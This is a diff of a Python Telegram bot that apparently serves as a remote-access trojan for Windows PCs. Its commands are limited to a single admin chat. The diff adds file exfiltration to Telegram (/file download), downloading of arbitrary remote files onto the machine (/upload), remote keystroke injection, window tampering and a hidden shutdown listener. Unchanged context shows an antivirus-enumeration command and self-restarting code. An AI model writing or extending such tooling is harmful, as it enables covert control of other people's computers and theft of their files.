@@ -285,6 +285,47 @@ atexit.register(cleanup_lock)
 
 check_lock()
 
+
+# Определяем класс для обработки оконных сообщений
+
+
+class Window:
+    def __init__(self):
+        self.hwnd = None
+
+    def create_window(self):
+        wc = win32gui.WNDCLASS()
+        wc.lpfnWndProc = self.wnd_proc
+        wc.lpszClassName = 'SessionListener'
+        wc.hInstance = win32api.GetModuleHandle(None)
+        wc_atom = win32gui.RegisterClass(wc)  # Регистрация класса окна
+        self.hwnd = win32gui.CreateWindow(
+            wc_atom,  # Используем зарегистрированный класс
+            'Session Listener', 
+            0, 0, 0, 0, 0, 
+            0, 0, 
+            wc.hInstance, 
+            None
+        )
+        win32gui.PumpMessages()
+
+    def wnd_proc(self, hwnd, msg, wparam, lparam):
+        if msg == win32con.WM_QUERYENDSESSION:
+            self.handle_query_end_session(wparam)
+            return 0  # Указываем, что сообщение обработано
+        return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)
+
+    def handle_query_end_session(self, wparam):
+        bot.send_message(admin_id, f'Комьпютер выключается...')
+
+def run_listener_shutdown():
+    listener_shutdown = Window()
+    listener_shutdown.create_window()
+
+listener_shutdown_thr = threading.Thread(target=run_listener_shutdown)
+listener_shutdown_thr.start()
+
+
 def run_restarter():
     try:
         if 'Python' not in sys.prefix:
@@ -333,12 +374,38 @@ def antiviruses(message):
 
         bot.send_message(admin_id, antivirus_list_text)  # Send to admin
 
-@bot.message_handler(commands=['flash'])
-def flash(message):
+import queue
+
+gui_queue = queue.Queue()
+result_queue = queue.Queue()
+
+def gui_thread():
+    import pymsgbox
+    while True:
+        text = gui_queue.get()
+        if text == 'STOP':
+            break
+        ans = pymsgbox.prompt(text)
+        result_queue.put(ans)
+
+# Запускаем один раз при старте бота
+threading.Thread(target=gui_thread, daemon=True).start()
+
+@bot.message_handler(commands=['chat'])
+def chat(message):
     if message.chat.id == admin_id:
-        title_str = message.text.replace('/flash', '').strip()
-        os.system(f'nircmd win flash title {title_str} 2')
-        bot.send_message(admin_id, f'Окно {title_str} моргает в течение 2 секунд')
+        command_text = message.text.replace('/chat', '').strip()
+        if not command_text:
+            bot.reply_to(message, "Использование:\n/chat <текст>")
+            return
+        gui_queue.put(command_text)
+        ans = result_queue.get()  # Ожидаем ответ из GUI-потока
+        if ans is not None:
+            bot.send_message(message.chat.id, f"Ответ из PyMsgBox: {ans}")
+        else:
+            bot.send_message(message.chat.id, "PyMsgBox был закрыт без ввода.")
+
+
 
 @bot.message_handler(commands=['setvolume'])
 def setvol(message):
@@ -703,9 +770,9 @@ def is_admin(message):
         try:
             admin = ctypes.windll.shell32.IsUserAnAdmin()
             if admin:
-                bot.send_message(message.chat.id, f"Права админа: ")
+                bot.send_message(message.chat.id, f"Права админа: Да")
             else:
-                bot.send_message(message.chat.id, f"Права админа: ")
+                bot.send_message(message.chat.id, f"Права админа: Нет")
         except Exception as e:
             bot.send_message(message.chat.id, f"Ошибка при попытке проверить права админа: {str(e)}")
 
@@ -1380,36 +1447,6 @@ def current_dir(message):
             # В случае ошибки отправляем сообщение об ошибке
             bot.reply_to(message, f' Произошла ошибка: {str(e)}')
 
-@bot.message_handler(commands=['title'])
-def handle_window_commands(message):
-    if message.chat.id == admin_id:
-        try:
-            # Получаем текст после команды
-            command_text = message.text.split(maxsplit=1)[1].strip()
-            
-            # Разбиваем текст на части, используя shlex
-            parts = shlex.split(command_text)
-            
-            # Проверяем количество аргументов
-            if len(parts) != 2:
-                raise ValueError('Неверный формат команды. Используйте: /title "текущий_заголовок" "новый_заголовок"')
-            
-            window_title = parts[0].strip('"')
-            new_title = parts[1].strip('"')
-            
-            # Находим окно и меняем заголовок
-            hwnd = win32gui.FindWindow(None, window_title)
-            if hwnd == 0:
-                bot.reply_to(message, f' Окно с заголовком \'{window_title}\' не найдено')
-                return
-                
-            win32gui.SetWindowText(hwnd, new_title)
-            bot.reply_to(message, f' Заголовок окна изменен на \'{new_title}\'')
-            
-        except ValueError as e:
-            bot.reply_to(message, f' {str(e)}')
-        except Exception as e:
-            bot.reply_to(message, f' Произошла ошибка: {str(e)}')
 
 @bot.message_handler(commands=['file'])
 def file_commands(message):
@@ -1429,6 +1466,7 @@ def file_commands(message):
                 /file delete <путь> - удалить файл
                 /file create <путь> - создать файл
                 /file edit <путь> <содержимое> - редактировать файл
+                /file download <путь> - загрузить файл с ПК
                 """)
                 return
                 
@@ -1481,6 +1519,31 @@ def file_commands(message):
                         bot.send_message(message.chat.id, result[i:i + 4096])
                 else:
                     bot.send_message(message.chat.id, result)
+                    
+            elif command == 'download':
+                # Проверяем, указан ли путь
+                if not params:
+                    bot.reply_to(message, "Использование: /file download <путь_к_файлу>")
+                    return
+                    
+                # Проверяем существование файла
+                if not os.path.exists(params):
+                    bot.reply_to(message, f"Файл '{file_path}' не найден")
+                    return
+
+                file_name = os.path.basename(params)
+
+                    
+                # Отправляем файл
+                try:
+                    with open(file_path, 'rb') as file:
+                        bot.send_document(
+                            chat_id=message.chat.id,
+                            document=file,
+                            caption=f"Файл '{file_name}' успешно загружен!"
+                        )
+                except Exception as e:
+                    bot.reply_to(message, f"Ошибка при отправке файла: {str(e)}")
                     
             elif command == 'zip':
                 folder = params
@@ -1564,91 +1627,6 @@ def file_commands(message):
                     
         except Exception as e:
             bot.reply_to(message, f" Ошибка при работе с файлами: {str(e)}")
-
-@bot.message_handler(commands=['transparent'])
-def handle_window_commands(message):
-    if message.chat.id == admin_id:
-        """
-        Обработчик команд для работы с окнами:
-        /transparent <заголовок_окна> <прозрачность>
-        /title <заголовок_окна> <новый_заголовок>
-        """
-        try:
-            # Получаем текст после команды
-            command_text = message.text.split(maxsplit=1)[1].strip()
-            
-            # Разбиваем текст на части, учитывая кавычки
-            parts = []
-            current_part = ""
-            in_quotes = False
-            
-            for char in command_text:
-                if char == '"':
-                    in_quotes = not in_quotes
-                    if len(parts) > 0:
-                        parts.append(current_part.strip())
-                        current_part = ""
-                    continue
-                    
-                if char == ' ' and not in_quotes:
-                    if current_part:
-                        parts.append(current_part)
-                        current_part = ""
-                else:
-                    current_part += char
-                    
-            if current_part:
-                parts.append(current_part)
-                
-            # Определяем команду
-            if message.text.startswith('/transparent'):
-                if len(parts) != 2:
-                    bot.reply_to(message, ' Использование: /transparent "<заголовок_окна>" <прозрачность>')
-                    return
-                    
-                window_title = parts[0].strip('"')
-                try:
-                    alpha = int(parts[1])
-                    if not 0 <= alpha <= 255:
-                        bot.reply_to(message, ' Прозрачность должна быть от 0 до 255')
-                        return
-                except ValueError:
-                    bot.reply_to(message, ' Прозрачность должна быть числом от 0 до 255')
-                    return
-                    
-                # Устанавливаем прозрачность
-                hwnd = win32gui.FindWindow(None, window_title)
-                if hwnd == 0:
-                    bot.reply_to(message, f' Окно с заголовком \'{window_title}\' не найдено')
-                    return
-                    
-                win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE,
-                                    win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED)
-                win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(0,0,0), alpha, win32con.LWA_ALPHA)
-                
-                bot.reply_to(message, f' Прозрачность окна \'{window_title}\' установлена на {alpha}')
-                
-            elif message.text.startswith('/title'):
-                if len(parts) != 2:
-                    bot.reply_to(message, ' Использование: /title "<заголовок_окна>" "<новый_заголовок>"')
-                    return
-                    
-                window_title = parts[0].strip('"')
-                new_title = parts[1].strip('"')
-                
-                # Находим окно и меняем заголовок
-                hwnd = win32gui.FindWindow(None, window_title)
-                if hwnd == 0:
-                    bot.reply_to(message, f' Окно с заголовком \'{window_title}\' не найдено')
-                    return
-                    
-                win32gui.SetWindowText(hwnd, new_title)
-                bot.reply_to(message, f' Заголовок окна изменен на \'{new_title}\'')
-                
-        except Exception as e:
-            bot.reply_to(message, f' Произошла ошибка: {str(e)}')
-        except Exception as e:
-            bot.reply_to(message, f' Произошла ошибка: {str(e)}')
 
 def get_all_window_titles():
     """
@@ -1938,123 +1916,69 @@ def mouse_commands(message):
                     bot.reply_to(message, "Неверный формат координат.  Используйте: /mouse move x y")
                 except Exception as e:
                     bot.reply_to(message, f"Ошибка при перемещении мыши: {str(e)}")
+                    
+            
             
             else:
-                bot.reply_to(message, "Неизвестная команда мыши. Доступные команды: move, up, down, click, moveto, scroll, drag")
+                bot.reply_to(message, "Неизвестная команда мыши. Доступные команды: move, click, moveto, scroll, drag")
 
 
         except Exception as e:
             bot.reply_to(message, f"Произошла ошибка при управлении мышью: {str(e)}")
 
+@bot.message_handler(commands=['keyboard'])
+def keyboard_commands(message):
+    # Разрешаем только админу
+    if message.chat.id != admin_id:
+        return
 
+    try:
+        keyboard_command = message.text.replace('/keyboard', '', 1).strip()
 
-
-@bot.message_handler(commands=['shake_cursor'])
-def shake_cursor(message):
-    if message.chat.id == admin_id:
-        for _ in range(5):
-            randx = random.choice([-10, 10])
-            randy = random.choice([-10, 10])
-            pyautogui.move(randx, randy)
-        bot.send_message(admin_id, f" Готово!")
-
-@bot.message_handler(commands=['shake_window'])
-def handler(message):
-    if message.chat.id == admin_id:
-        try:
-            # Получаем текст после команды
-            shake_str = message.text.replace('/shake_window', '').strip()
-
-            # Проверяем, не пустое ли сообщение
-            if not shake_str:
-                bot.reply_to(message, "Пожалуйста, отправьте заголовок для тряски после команды!")
-                return
-
-            # Разбиваем строку на отдельные клавиши
-            shake = [key.strip().lower() for key in shake_str.split(',')]
-
-        except Exception as e:
-            bot.reply_to(message, f"Произошла ошибка при обработке команды: {str(e)}")
-
-        finally:
-            # Дополнительные действия после выполнения блока try/except
-            pass
-        """
-        Находит окно по заголовку и трясет его.
-
-        Args:
-            window_title: Заголовок окна, которое нужно трясти.
-        """
-        # Находим окно по заголовку
-        hwnd = win32gui.FindWindow(None, shake_str)
-        if hwnd == 0:
-            print("Окно не найдено")
-            return
-
-        # Получаем текущую позицию
-        rect = win32gui.GetWindowRect(hwnd)
-        x = rect[0]
-        y = rect[1]
-        width = rect[2] - rect[0]
-        height = rect[3] - rect[1]
-
-        # Параметры тряски
-        dx = 6  # Смещение по X
-        dy = 6  # Смещение по Y
-        shake_duration = 1  # Продолжительность тряски в секундах
-        start_time = time.time()
-
-        while time.time() - start_time < shake_duration:
-            # Двигаем окно вправо и вниз
-            win32gui.MoveWindow(hwnd, x + dx, y + dy, width, height, True)
-            time.sleep(0.02)  #задержка
-
-            # Двигаем окно влево и вверх
-            win32gui.MoveWindow(hwnd, x - dx, y - dy, width, height, True)
-            time.sleep(0.02)  #задержка
-
-        # Возвращаем окно на исходную позицию
-        win32gui.MoveWindow(hwnd, x, y, width, height, True)
-
-@bot.message_handler(commands=['drag'])
-def drag_mouse(message):
-    if message.chat.id == admin_id:
-        """Перетаскивает мышь с одной точки в другую"""
-        try:
-            # Получаем координаты начала и конца из сообщения
-            coords = message.text.replace('/drag', '').strip()
-            if not coords:
-                bot.reply_to(message, "Использование: /drag x1,y1 x2,y2")
-                return
-                
-            # Разбиваем строку на две пары координат
+        # /keyboard type <текст>
+        if keyboard_command.lower().startswith('type'):
             try:
-                start_coords, end_coords = coords.split()
-                start_x, start_y = map(int, start_coords.split(','))
-                end_x, end_y = map(int, end_coords.split(','))
-            except ValueError:
-                bot.reply_to(message, "Ошибка: Неверный формат координат. Используйте формат: x1,y1 x2,y2")
-                return
-            
-            # Получаем размеры экрана для проверки границ
-            screen_width, screen_height = pyautogui.size()
-            
-            # Проверяем все координаты
-            if (start_x < 0 or start_x > screen_width or start_y < 0 or start_y > screen_height or
-                end_x < 0 or end_x > screen_width or end_y < 0 or end_y > screen_height):
-                bot.reply_to(message, f"Ошибка: Все координаты должны быть в пределах экрана ({screen_width}x{screen_height})")
-                return
-            
-            # Перемещаем и перетаскиваем курсор
-            pyautogui.moveTo(start_x, start_y)
-            pyautogui.mouseDown()
-            pyautogui.moveTo(end_x, end_y,duration=1)
-            pyautogui.mouseUp()
-            
-            bot.reply_to(message, f"Перетаскивание выполнено от ({start_x},{start_y}) до ({end_x},{end_y})")
-            
-        except Exception as e:
-            bot.reply_to(message, f"Произошла ошибка при перетаскивании: {str(e)}")
+                keys = message.text.replace('/keyboard type', '', 1).strip()
+                if not keys:
+                    bot.reply_to(message, "Пожалуйста, укажите текст для ввода после команды.")
+                    return
+                pyautogui.typewrite(keys)
+                bot.reply_to(message, f"Текст '{keys}' успешно введён")
+            except Exception as e:
+                bot.reply_to(message, f"Ошибка при печати на клавиатуре: {e}")
+
+        # /keyboard hotkey key1, key2, key3
+        elif keyboard_command.lower().startswith('hotkey'):
+            try:
+                keys_str = message.text.replace('/keyboard hotkey', '', 1).strip()
+                if not keys_str:
+                    bot.reply_to(message,
+                                 "Пожалуйста, отправьте клавиши для нажатия после команды!\nВ формате: winleft, up или ctrl, alt, del")
+                    return
+
+                keys = [k.strip().lower() for k in keys_str.split(',')]
+
+                # Поддерживаем разные версии pyautogui: KEYBOARD_KEYS или KEY_NAMES
+                valid_keys = getattr(pyautogui, 'KEYBOARD_KEYS', None) or getattr(pyautogui, 'KEY_NAMES', None)
+                if valid_keys is None:
+                    # на всякий случай — допустим, что pyautogui не имеет списка; в таком случае пропускаем проверку
+                    valid_keys = []
+
+                for key in keys:
+                    if valid_keys and key not in valid_keys:
+                        bot.reply_to(message,
+                                     f"Неверное название клавиши: {key}.\nСписок доступных клавиш: https://pyautogui.readthedocs.io/en/latest/keyboard.html#keyboard-keys")
+                        return
+
+                pyautogui.hotkey(*keys)
+                bot.reply_to(message, f"Клавиши '{keys_str}' успешно нажаты!")
+            except Exception as e:
+                bot.reply_to(message, f"Произошла ошибка: {e}")
+
+        else:
+            bot.reply_to(message, "Неизвестная подкоманда. Используйте 'type' или 'hotkey'.")
+    except Exception as e:
+        bot.reply_to(message, f"Ошибка обработки команды: {e}")
 
 @bot.message_handler(commands=['process'])
 def process_commands(message):
@@ -2310,9 +2234,9 @@ def matrix(message):
 @bot.message_handler(commands=['window'])
 def window_commands(message):
     if message.chat.id == admin_id:
-        """Расширенные команды для управления окнами"""
         try:
             command_text = message.text.replace('/window', '').strip()
+            
             if not command_text:
                 bot.reply_to(message, """
                 Доступные команды:
@@ -2320,31 +2244,85 @@ def window_commands(message):
                 /window maximize <заголовок> - разворачивает окно
                 /window restore <заголовок> - восстанавливает размер окна
                 /window close <заголовок> - закрывает окно
+                /window title <заголовок> <новый_заголовок> - меняет заголовок
+                /window transparent <заголовок> <прозрачность_0_255> - меняет прозрачность
                 """)
                 return
                 
-            command, window_title = command_text.split(maxsplit=1)
+            # Разделяем команду и аргументы
+            parts = command_text.split(maxsplit=2)
+            command = parts[0].lower()
+            
+            if len(parts) < 2:
+                bot.reply_to(message, "Пожалуйста, укажите команду и заголовок окна.")
+                return
+
+            window_title = parts[1]
+            
             hwnd = win32gui.FindWindow(None, window_title)
             
             if hwnd == 0:
-                bot.reply_to(message, f" Окно с заголовком '{window_title}' не найдено")
+                bot.reply_to(message, f"Окно с заголовком '{window_title}' не найдено.")
                 return
 
             if command == 'minimize':
                 win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
-                bot.reply_to(message, f" Окно '{window_title}' свернуто")
+                bot.reply_to(message, f"Окно '{window_title}' свернуто.")
+            
             elif command == 'maximize':
                 win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
-                bot.reply_to(message, f" Окно '{window_title}' развернуто")
+                bot.reply_to(message, f"Окно '{window_title}' развернуто.")
+                
             elif command == 'restore':
                 win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
-                bot.reply_to(message, f" Окно '{window_title}' восстановлено")
+                bot.reply_to(message, f"Окно '{window_title}' восстановлено.")
+                
             elif command == 'close':
                 win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
-                bot.reply_to(message, f" Окно '{window_title}' закрыто")
+                bot.reply_to(message, f"Окно '{window_title}' закрыто.")
+
+            elif command == 'title':
+                if len(parts) != 3:
+                    bot.reply_to(message, "Использование: /window title <заголовок> <новый_заголовок>")
+                    return
                 
+                new_title = parts[2]
+                win32gui.SetWindowText(hwnd, new_title)
+                bot.reply_to(message, f"Заголовок окна '{window_title}' изменен на '{new_title}'.")
+                
+            elif command == 'transparent':
+                if len(parts) != 3:
+                    bot.reply_to(message, "Использование: /window transparent <заголовок> <значение_0_255>")
+                    return
+                
+                try:
+                    transparency_level = int(parts[2])
+                    if not (0 <= transparency_level <= 255):
+                         bot.reply_to(message, "Уровень прозрачности должен быть в диапазоне от 0 до 255.")
+                         return
+                         
+                    # Устанавливаем стили для поддержки прозрачности (если они еще не установлены)
+                    style = win32api.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
+                    style |= win32con.WS_EX_LAYERED
+                    win32api.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, style)
+                    
+                    # Устанавливаем прозрачность (0 = полностью прозрачный, 255 = полностью непрозрачный)
+                    win32gui.SetLayeredWindowAttributes(hwnd, 0, transparency_level, win32con.LWA_ALPHA)
+                    
+                    bot.reply_to(message, f"Прозрачность окна '{window_title}' установлена на {transparency_level}.")
+
+                except ValueError:
+                    bot.reply_to(message, "Неверный формат для уровня прозрачности. Ожидается число.")
+                    
+            else:
+                bot.reply_to(message, f"Неизвестная команда '{command}'.")
+
+        except ValueError:
+            # Это часто происходит, если команда требует 2 или 3 части, а получено только 2
+            bot.reply_to(message, "Неверный формат команды. Проверьте синтаксис и количество аргументов.")
+
         except Exception as e:
-            bot.reply_to(message, f" Ошибка при управлении окном: {str(e)}")
+            bot.reply_to(message, f"Произошла ошибка при управлении окном: {str(e)}")
 
 @bot.message_handler(commands=['list_programs'])
 def list_programs(message):
@@ -2558,15 +2536,70 @@ start {final_path}""")
 # Создаем экземпляр FileUpdater
 file_updater = FileUpdater()
 
+from urllib.parse import urlparse
+
 # Обработчик команды /update
 @bot.message_handler(commands=['update'])
 def handle_update_command(message):
     file_updater.handle_update_command(message)
 
+def get_filename_from_url_urllib(url):
+    parsed_url = urlparse(url)
+    path = parsed_url.path
+    return os.path.basename(path)
+
 # Обработчик команды /upload
 @bot.message_handler(commands=['upload'])
 def upload_command(message):
-    bot.reply_to(message, "Пожалуйста, отправьте файл для загрузки или напишите прямую ссылку на загрузку файла через curl")
+    if message.chat.id == admin_id:
+        
+        # Получаем аргументы после команды /upload
+        # Например, если сообщение: "/upload http://example.com/file.zip"
+        parts = message.text.split()
+        
+        if len(parts) < 2:
+            bot.reply_to(message, "Пожалуйста, предоставьте прямую ссылку на файл. Пример: /upload https://example.com/file.zip")
+            return
+            
+        # URL - это второй элемент в списке частей
+        url_to_download = parts[1]
+        
+        try:
+            # 1. Извлекаем имя файла из полученной ссылки
+            file_name = get_filename_from_url_urllib(url_to_download)
+            
+            if not file_name:
+                bot.send_message(admin_id, "Не удалось извлечь имя файла из ссылки.")
+                return
+
+            # 2. Скачиваем файл, используя curl (или requests, что безопаснее)
+            # ВАЖНО: Если execute_command запускает внешний curl, убедитесь, что он корректно работает в вашей среде.
+            
+            # Рекомендуемая замена: использовать requests для скачивания, если вы не хотите зависеть от внешнего curl
+            download_result = download_file_with_requests(url_to_download, file_name)
+            
+            bot.send_message(admin_id, download_result)
+                
+        except Exception as e:
+            bot.send_message(admin_id, f'Критическая ошибка в комманде /upload: {e}')
+
+
+# --- Рекомендуемая замена для 'execute_command(curl...)' ---
+# Безопаснее использовать Python-библиотеки для скачивания, а не вызывать внешние процессы.
+
+def download_file_with_requests(url, output_filename):
+    try:
+        response = requests.get(url, stream=True)
+        response.raise_for_status() # Проверка на ошибки HTTP
+        
+        with open(output_filename, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        
+        return f"Файл '{output_filename}' успешно скачан."
+        
+    except requests.exceptions.RequestException as e:
+        return f"Ошибка при скачивании {url}: {e}"
 
 # Единый обработчик всех документов
 @bot.message_handler(content_types=['document'])
@@ -2808,90 +2841,7 @@ def start(message):
                 chat_id=message.chat.id,
                 text=f'Произошла ошибка: {str(e)}'
             )
-
-@bot.message_handler(commands=['hotkey'])
-def keyboard(message):
-    if message.chat.id == admin_id:
-        try:
-            # Получаем текст после команды
-            keys_str = message.text.replace('/hotkey', '').strip()
-
-            # Проверяем, не пустое ли сообщение
-            if not keys_str:
-                bot.reply_to(message, "Пожалуйста, отправьте клавиши для нажатия после команды!")
-                bot.reply_to(message, "В формате: winleft, up или ctrl, alt, del")
-                return
-
-            # Разбиваем строку на отдельные клавиши
-            keys = [key.strip().lower() for key in keys_str.split(',')]
-
-            # Проверяем что клавиши введены корректно
-            for key in keys:
-                if key not in pyautogui.KEY_NAMES:
-                    bot.reply_to(message,
-                                f"Неверное название клавиши: {key}.\nСписок доступных клавиш: https://pyautogui.readthedocs.io/en/latest/keyboard.html#keyboard-keys")
-                    return
-            pyautogui.hotkey(*keys)  # Распаковываем список в аргументы функции
-            bot.reply_to(message, f"Клавиши '{keys_str}' успешно нажаты!")
-
-        except Exception as e:
-            bot.reply_to(message, f"Произошла ошибка: {e}")
-
-            # Подтверждаем успешную обработку
-            bot.reply_to(message, "Клавиши нажаты!")
-
-        except Exception as e:
-            bot.reply_to(message, f"Ошибка в команде hotkey: {str(e)}")
-
-
-@bot.message_handler(commands=['type'])
-def type(message):
-    if message.chat.id == admin_id:
-        try:
-            # Получаем текст после команды
-            key_str = message.text.replace('/type', '').strip()
-
-            # Проверяем, не пустое ли сообщение
-            if not key_str:
-                bot.reply_to(message, "Пожалуйста, отправьте клавиши для нажатия!")
-                return
-
-            # Преобразуем в нижний регистр для единообразия
-            key = key_str.lower()
-            
-            # Нажимаем каждую букву отдельно с задержкой
-            for char in key:
-                kb.write(char)
-                time.sleep(00.025)  # пауза между буквами
-
-            bot.reply_to(message, f"Текст '{key}' успешно введен!")
-
-        except Exception as e:
-            bot.reply_to(message, f"Произошла ошибка: {e}")
-
-@bot.message_handler(commands=['plyer_msgbox'])
-def plyer_msgbox(message):
-    if message.chat.id == admin_id:
-        try:
-            # Получаем текст после команды
-            alert_text = message.text.replace('/plyer_msgbox', '').strip()
-
-            # Проверяем, не пустое ли сообщение
-            if not alert_text:
-                bot.reply_to(message, "Пожалуйста, отправьте текст после команды!")
-                return
-
-            # Показываем уведомление
-            plyer.notification.notify(
-            title='ㅤ',
-            message=alert_text
-            )
-
-            # Подтверждаем успешную обработку
-            bot.reply_to(message, "Уведомление показано!")
-
-        except Exception as e:
-            bot.reply_to(message, f"Произошла ошибка при показе уведомления: {str(e)}")
+        
 
 @bot.message_handler(commands=['msgbox'])
 def msgbox(message):
